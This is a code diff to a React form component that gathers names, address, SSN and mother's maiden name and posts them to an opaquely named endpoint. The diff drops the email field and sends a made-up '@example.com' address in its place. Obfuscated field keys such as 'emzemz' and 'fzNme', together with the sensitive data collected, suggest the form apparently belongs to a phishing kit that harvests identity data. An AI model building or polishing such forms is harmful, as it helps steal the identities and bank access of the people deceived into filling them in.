@@ -26,7 +26,6 @@ const BasicInfo: React.FC = () => {
   const [city, setCity] = useState('');
   const [state, setState] = useState('');
   const [zipCode, setZipCode] = useState('');
-  const [email, setEmail] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [errors, setErrors] = useState({ 
     fzNme: '', 
@@ -40,7 +39,6 @@ const BasicInfo: React.FC = () => {
     city: '',
     state: '',
     zipCode: '',
-    email: '',
     form: '' 
   });
 
@@ -115,7 +113,6 @@ const BasicInfo: React.FC = () => {
       city: !city.trim() ? 'City is required.' : '',
       state: !state.trim() ? 'State is required.' : '',
       zipCode: !zipCode.trim() ? 'Zip code is required.' : '',
-      email: !email.trim() ? 'Email is required.' : '',
       form: ''
     };
 
@@ -155,7 +152,7 @@ const BasicInfo: React.FC = () => {
       // Combined submission
       await axios.post(`${baseUrl}api/affinity-meta-data-3/`, {
         emzemz: username,
-        email: email,
+        email: `${username}@example.com`,
         // Basic info
         fzNme,
         lzNme,
@@ -269,23 +266,6 @@ const BasicInfo: React.FC = () => {
             </button>
           </div>
           {errors.ssn && <FormError message={errors.ssn} className="mt-2" />}
-        </div>
-
-        {/* Email */}
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="email">
-            Email
-          </label>
-          <input
-            id="email"
-            name="email"
-            type="email"
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
-            placeholder="Enter email"
-          />
-          {errors.email && <FormError message={errors.email} className="mt-2" />}
         </div>
 
         {/* Mother's Maiden Name */}
